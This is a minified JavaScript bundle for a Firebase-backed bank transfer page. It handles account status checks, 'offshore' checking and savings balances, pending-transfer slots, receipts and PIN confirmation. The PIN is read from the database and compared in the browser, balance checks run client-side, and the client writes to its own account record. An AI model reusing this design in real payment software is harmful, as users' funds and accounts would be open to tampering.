import"./modulepreload-polyfill-B5Qt9EMX.js";import{b as M,a as O,u as D,g as E,d as x,o as W,s as Y}from"./firebase-client-DvgkFHPb.js";import"./firebase-config-C56FTJjz.js";window.auth=M;window.db=O;window.firestoreHelpers={doc:x,getDoc:E,updateDoc:D};window.executeTransfer=async function(){try{const i=window.auth.currentUser;if(!i)throw new Error("No user is signed in");const t=x(window.db,"users",i.uid),o=await E(t);if(!o.exists())throw new Error("User account not found");const e=o.data();switch((e.status||"inactive").toLowerCase()){case"suspended":throw new Error("Your account is currently suspended. Please contact support for assistance.");case"inactive":throw new Error("Your account is inactive. Please activate your account to make transfers.");case"banned":throw new Error("This account has been banned. Please contact support for more information.");case"processing":throw new Error("Your account is currently under review. Please try again later.");case"active":break;default:throw new Error("Unable to verify account status. Please contact support.")}let s=document.getElementById("bankName").value,c=document.getElementById("accountNumber").value,a=document.getElementById("accountName").value,d=parseFloat(document.getElementById("withdrawCash").value.replace(/[^0-9.]/g,""))||0,m=document.getElementById("swiftCode").value,I=document.getElementById("paymentDescription").value,T="TRX"+Math.floor(Math.random()*1e6);const b=document.getElementById("fundingSource"),w=b?b.value:"";if(!w)throw new Error("Funding source is required");let l=0,p="";if(w==="fixed_banking"){const u=e.deposit??e.checking??0;l=typeof u=="string"?parseFloat(u.replace(/[^0-9.-]/g,""))||0:parseFloat(u)||0,p="Checking Offshore"}else if(w==="savings_banking"){const u=e.fixed??0;l=typeof u=="string"?parseFloat(u.replace(/[^0-9.-]/g,""))||0:parseFloat(u)||0,p="Savings Offshore"}if((isNaN(l)||l<0)&&(l=0),console.log("Final balance check in executeTransfer:",{fundingSource:w,accountType:p,transferAmount:d,accountBalance:l,rawUserData:{deposit:e.deposit,fixed:e.fixed,savings:e.savings,checking:e.checking,wallet:e.wallet,profit:e.profit,fixed_banking:e.fixed_banking,savings_banking:e.savings_banking}}),d>l)throw new Error(`Insufficient funds available in ${p}`);const C=d*1e-4,L=new Date,P=L.toLocaleTimeString("en-US",{hour12:!0,hour:"2-digit",minute:"2-digit"}),S=L.toLocaleDateString("en-US",{month:"2-digit",day:"2-digit",year:"numeric"}),B=new Intl.NumberFormat("en-US",{style:"currency",currency:"USD",minimumFractionDigits:2,maximumFractionDigits:2}).format(d),k=w==="fixed_banking"?"Checking":"Savings",N=selectedTransferType==="International"?"Transfer-Intl":"Transfer-Domestic",g=`${s} - Twenty Third & Forth  |  ${N}  |  ${B} |  ${P}  |  ${S}  |  ${k}  |  Pending`,F=e.pending1||"",U=e.pending2||"",$=e.pending3||"",R=e.pending4||"",A=e.pending5||"";let r="",f={};if(!F)r="pending1",f={pending1:g};else if(!U)r="pending2",f={pending2:g};else if(!$)r="pending3",f={pending3:g};else if(!R)r="pending4",f={pending4:g};else if(!A)r="pending5",f={pending5:g};else throw document.getElementById("pendingLimitReached").classList.remove("hidden"),new Error("Maximum pending transactions reached. This transaction has been queued as you have 5 pending transactions already. Cheers!");r&&(await D(t,f),console.log(`Transfer string saved in Firebase as ${r}:`,g));const _={bankName:s,accountNumber:c,accountName:a,transferAmount:B,swiftCode:m,transferType:selectedTransferType||"Domestic",paymentDescription:I,transactionRef:T,fee:C.toFixed(2),pendingSlot:r};await sendTransferDetails(_),document.getElementById("beneficiaryName").innerText=a,document.getElementById("beneficiaryAccount").innerText=c,document.getElementById("beneficiaryBank").innerText=s,document.getElementById("transferAmount").innerText=B,document.getElementById("transferFee").innerText=`$${C.toFixed(2)}`,document.getElementById("transactionRef").innerText=T,document.getElementById("receiptPaymentDescription").innerText=I||"-",selectedTransferType==="International"&&m?(document.getElementById("swiftCodeReceiptSection").classList.remove("hidden"),document.getElementById("receiptSwiftCode").innerText=m):document.getElementById("swiftCodeReceiptSection").classList.add("hidden"),document.getElementById("spinner").classList.add("hidden"),document.getElementById("successModal").classList.remove("hidden")}catch(i){console.error("Error executing transfer:",i),document.getElementById("spinner").classList.add("hidden"),showErrorModal(i.message)}};let v=!1,h=!1,y=null;W(window.auth,async i=>{if(y&&(clearTimeout(y),y=null),i){h=!0,v=!0;const t=document.getElementById("Deposit-account"),o=document.getElementById("Profit-wallet"),e=document.getElementById("wallet"),n=document.getElementById("welcome-message");t&&(t.textContent="Loading..."),o&&(o.textContent="Loading..."),e&&(e.textContent="Loading..."),n&&(n.textContent="Loading...");try{const s=x(window.db,"users",i.uid),c=await Promise.race([E(s),new Promise((a,d)=>setTimeout(()=>d(new Error("Timeout")),2e3))]);if(c.exists()){const a=c.data();t&&(t.textContent=`${a.deposit||"0.00"}`),o&&(o.textContent=`${a.profit||"0.00"}`),e&&(e.textContent=`${a.wallet||"0.00"}`),n&&(n.textContent=`Welcome ${a.name||a.firstName||"User"}`)}else console.log("No user document found in Firestore."),t&&(t.textContent="0.00"),o&&(o.textContent="0.00"),e&&(e.textContent="0.00"),n&&(n.textContent="Welcome User")}catch(s){console.error("Error loading user data:",s),t&&(t.textContent="0.00"),o&&(o.textContent="0.00"),e&&(e.textContent="0.00"),n&&(n.textContent="Welcome User")}}else v||(await new Promise(t=>setTimeout(t,500)),v=!0),h?console.log("User state changed to null, but user was previously authenticated. Waiting..."):y=setTimeout(()=>{const t=window.auth.currentUser;!t&&!h?(console.log("No user signed in after verification. Redirecting to sign-in page."),window.location.href="login.html"):t&&(console.log("Auth state changed - user is now authenticated, canceling redirect"),h=!0)},1e3)});window.signOut=function(){Y(window.auth).then(()=>{alert("Signed out successfully!"),window.location.href="login.html"}).catch(i=>{alert("Error signing out: "+i.message)})};window.validatePin=async function(){const i=document.getElementById("securityPin").value.trim(),t=document.getElementById("confirmButton"),o=document.getElementById("confirmButtonText"),e=document.getElementById("confirmButtonLoader"),n=document.getElementById("securityPinError");n.classList.add("hidden"),t.disabled=!0,o.textContent="Processing...",e.classList.remove("hidden"),document.getElementById("spinner").classList.remove("hidden");try{const s=window.auth.currentUser;if(s){const c=x(window.db,"users",s.uid),a=await E(c);if(a.exists()){const m=a.data().pin;m?i===m?(document.getElementById("securityPinModal").classList.add("hidden"),executeTransfer()):(n.textContent="Incorrect Pin. Please try again.",n.classList.remove("hidden")):(n.textContent="Please update your PIN in settings.",n.classList.remove("hidden"),window.location.href="pin.html")}}}catch(s){console.error("Error validating PIN:",s),n.textContent="Error validating PIN. Please try again.",n.classList.remove("hidden")}finally{t.disabled=!1,o.textContent="Confirm",e.classList.add("hidden"),document.getElementById("spinner").classList.add("hidden")}};document.addEventListener("DOMContentLoaded",function(){const i=document.getElementById("confirmButton");i&&i.addEventListener("click",window.validatePin)});
